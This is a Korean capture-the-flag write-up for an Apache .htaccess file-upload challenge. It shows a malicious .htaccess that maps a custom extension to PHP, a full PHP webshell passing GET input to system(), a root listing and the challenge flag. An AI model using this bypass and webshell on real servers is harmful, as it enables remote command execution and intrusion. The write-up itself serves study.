https://teberr.notion.site/Apache-htaccess-af6fbe5fdd90405fa57de02e070f4635

# 문제파일 다운로드

![문제파일 다운로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/7c0b6367-fd97-4cd7-b27b-a34a4f5b077f/%EB%AC%B8%EC%A0%9C%ED%8C%8C%EC%9D%BC_%EB%8B%A4%EC%9A%B4%EB%A1%9C%EB%93%9C.png)

Apache htaccess 문제파일을 다운로드 받으면 src폴더와 도커파일, 000-default.conf 파일이 있다. 

src 폴더 내에는 static, upload 폴더와 index.php파일, upload.php파일이 존재한다. 

php파일들 코드를 분석해보자.

# 코드 분석 및 공격 설계

### 000-default.conf

```html
<VirtualHost *:80>
	ServerAdmin webmaster@localhost
	DocumentRoot /var/www/html

	ErrorLog ${APACHE_LOG_DIR}/error.log
	CustomLog ${APACHE_LOG_DIR}/access.log combined

   <Directory /var/www/html/>
     AllowOverride All
     Require all granted
   </Directory>
</VirtualHost>
```

보면 AllowOverride 설정이 All로 되어있다. 이는 .htaccess 파일을 덮어씌우는걸 허용한다는 의미이다. 

.htaccess 파일은 로컬 설정파일로 이 설정파일이 존재하는 디렉토리에 대해 설정을 적용시킬 수 있다. 

```html
AddType application/x-httpd-php .xxx
```

위와 같은 내용으로 덮어씌워 .xxx 확장자 파일을 php파일로 인식시켜 확장자 필터링을 우회하거나 

```html
php_flag engine off
AddType text/plain .php
```

과 같은 내용으로 덮어씌워 php 내용을 평문으로 출력되게 하여 해커에게 공개하고 싶지 않아하는 php 코드를  수 있다.

### index.php

![index.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ac2bd4d4-38ab-47be-abd5-e4bc57c11792/index.png)

```html
<html>
    <head></head>
    <link rel="stylesheet" href="/static/bulma.min.css" />
    <body>
        <div class="container card">
        <div class="card-content">
        <h1 class="title">Online File Box</h1>
        <form action="upload.php" method="post" enctype="multipart/form-data">
            <div class="field">
                <div id="file-js" class="file has-name">
                    <label class="file-label">
                        <input class="file-input" type="file" name="file">
                        <span class="file-cta">
                            <span class="file-label">Choose a file...</span>
                        </span>
                        <span class="file-name">No file uploaded</span>
                    </label>
                </div>
            </div>
            <div class="control">
                <input class="button is-success" type="submit" value="submit">
            </div>
        </form>
        </div>
        </div>
        <script>
            const fileInput = document.querySelector('#file-js input[type=file]');
            fileInput.onchange = () => {
                if (fileInput.files.length > 0) {
                const fileName = document.querySelector('#file-js .file-name');
                fileName.textContent = fileInput.files[0].name;
                }
            }
        </script>
    </body>
</html>
```

사용자로부터 파일을 업로드하는 페이지이다. 

### upload.php

```php
<?php
$deniedExts = array("php", "php3", "php4", "php5", "pht", "phtml");

if (isset($_FILES)) {
    $file = $_FILES["file"];
    $error = $file["error"];
    $name = $file["name"];
    $tmp_name = $file["tmp_name"];
   
    if ( $error > 0 ) {
        echo "Error: " . $error . "<br>";
    }else {
        $temp = explode(".", $name);
        $extension = end($temp);
       
        if(in_array($extension, $deniedExts)){
            die($extension . " extension file is not allowed to upload ! ");
        }else{
            move_uploaded_file($tmp_name, "upload/" . $name);
            echo "Stored in: <a href='/upload/{$name}'>/upload/{$name}</a>";
        }
    }
}else {
    echo "File is not selected";
}
?>
```

upload 관련 코드인데 보면 php, php3, php4, php5, pht, phtml의 확장자들을 필터링하고 있다. 이 확장자가 아닌 경우 /upload 폴더에 업로드한 파일을 올리는 것을 확인할 수 있다. 이때 파일은 직접 선택해서 올리는 것이기 때문에 파일명에는 /이 들어갈 수 없어 pathTraversal이 되지 않는다.

정리하면 이 문제는 웹 서버에 파일 업로드를 할 수 있도록 구현되어 있다. 파일을 업로드하는데 웹쉘을 올리지 못하도록 확장자만을 필터링 하고 있다. 하지만 conf 파일에서 확인해 본 결과 디렉토리 내의 설정을 적용하는 아파치 웹서버의 로컬 설정파일인 .htaccess을 오버라이딩 할 수 있도록 되어있는 것을 확인할 수 있다.(기본 설정은 None으로 막혀있다.) 따라서 악의적인 .htaccess 파일을 업로드시켜 로컬 설정을 바꾸어 확장자 필터링을 우회할 것이다.

1. 악의적인 .htaccess 파일을 업로드하여 .xxx 확장자를 .php로 인식시킨다.
2. php 코드로 작성된 webshell[.xxx](http://웹쉘.xxx) 파일을 업로드한다. 이 웹쉘은 확장자가 xxx이므로 upload.php의 확장자 필터링을 우회하여 업로드가 가능하다.
3. 악의적인 로컬 설정파일인 .htaccess파일로 인해 [webshell.xxx](http://webshell.xxx) 파일은 webshell.php파일로 웹서버에서 인식된다.
4. 따라서 /upload/webshell.xxx 파일에 접근하여 웹쉘을 이용해 flag 파일을 찾는다.

# 공격

다음과 같은 내용으로 .htaccess 파일을 만든다. 아래 내용은 .xxx 확장자파일을 php 코드로 웹서버가 인식하도록 한다.

```html
AddType application/x-httpd-php .xxx
```

![악의적인 htaccess파일.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/cf87f056-ca79-4d77-ad50-41be2c353346/%EC%95%85%EC%9D%98%EC%A0%81%EC%9D%B8_htaccess%ED%8C%8C%EC%9D%BC.png)

그리고 웹쉘 파일을 만든다. 웹쉘은 [https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985](https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985) 에서 코드를 가져와서 사용했다. 웹쉘의 이름은 webshell.xxx로 만들어준다.

```html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```

![웹쉘.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/106a9437-5e08-471b-9ec4-52e95c2c9ea0/%EC%9B%B9%EC%89%98.png)

이제 index 페이지에서 악의적인 로컬 설정파일인 .htaccess를 업로드하자.

![htaccess 업로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b9442472-74fb-46c2-b87b-a65605239a4c/htaccess_%EC%97%85%EB%A1%9C%EB%93%9C.png)

![htaccess 업로드1.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/897816bf-16a4-4036-ba11-a5a4fd975603/htaccess_%EC%97%85%EB%A1%9C%EB%93%9C1.png)

이제 악의적인 webshell.xxx 파일을 업로드하자 악의적인 .htaccess 로컬 설정파일로 인해서 .xxx파일인 webshell.xxx는 실제로 웹서버에서 webshell.php로 인식하게 될 것이다.

![webshell .PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/70871a29-7312-4d25-8e5d-5f1c3e4980f9/webshell_.png)

![webshell 업로드.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bae1b2d1-5a4f-4711-9220-767711458a68/webshell_%EC%97%85%EB%A1%9C%EB%93%9C.png)

이제 웹쉘 파일을 접근하면 webshell.xxx를 webshell.php로 인식하여 웹쉘페이지가 열린다.

![웹쉘 페이지.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8bf22884-b59d-4b56-90cb-d8e037c7a7b8/%EC%9B%B9%EC%89%98_%ED%8E%98%EC%9D%B4%EC%A7%80.png)

이제 이 웹쉘페이지에서 ls -al / 명령어를 통해 루트 페이지를 확인해보자.

![루트.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/385dcfd3-2a71-4d12-8cad-729c957790a0/%EB%A3%A8%ED%8A%B8.png)

```html
total 92
dr-xr-xr-x   1 root root 4096 Dec  6 16:40 .
dr-xr-xr-x   1 root root 4096 Dec  6 16:40 ..
drwxr-xr-x   2 root root 4096 Jan 25  2022 bin
drwxr-xr-x   2 root root 4096 Apr 10  2014 boot
drwxr-xr-x   8 root root 2540 Dec  6 16:40 dev
drwxr-xr-x   1 root root 4096 Dec  6 16:40 etc
**---x--x--x   1 root root 8518 Jan 25  2022 flag**
drwxr-xr-x   2 root root 4096 Apr 10  2014 home
drwxr-xr-x  12 root root 4096 Jan 25  2022 lib
drwxr-xr-x   2 root root 4096 Dec 17  2019 lib64
drwxr-xr-x   2 root root 4096 Dec 17  2019 media
drwxr-xr-x   2 root root 4096 Apr 10  2014 mnt
drwxr-xr-x   2 root root 4096 Dec 17  2019 opt
dr-xr-xr-x 111 root root    0 Dec  6 16:40 proc
drwx------   2 root root 4096 Dec 17  2019 root
drwxr-xr-x   1 root root 4096 Jan 25  2022 run
drwxr-xr-x   2 root root 4096 Mar 25  2021 sbin
drwxr-xr-x   2 root root 4096 Dec 17  2019 srv
dr-xr-xr-x  11 root root    0 Dec  6 16:40 sys
drwxrwxrwt   1 root root 4096 Dec  6 16:42 tmp
drwxr-xr-x  10 root root 4096 Dec 17  2019 usr
drwxr-xr-x   1 root root 4096 Jan 25  2022 var
```

flag 파일이 루트페이지에 존재하며 실행권한만 존재하는 것을 확인할 수 있다. 따라서 루트페이지에 있는 flag 파일을 실행하면 플래그 값을 얻을 수 있다.

![flag.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c1b6cd81-4bb9-4023-8260-18fbfae0f94d/flag.png)

/flag 를 통해서 플래그 파일을 실행하면 `DH{9aeba1a6feed3769ae0915b62db2b4872bec98c2}` 플래그 값을 얻을 수 있다.
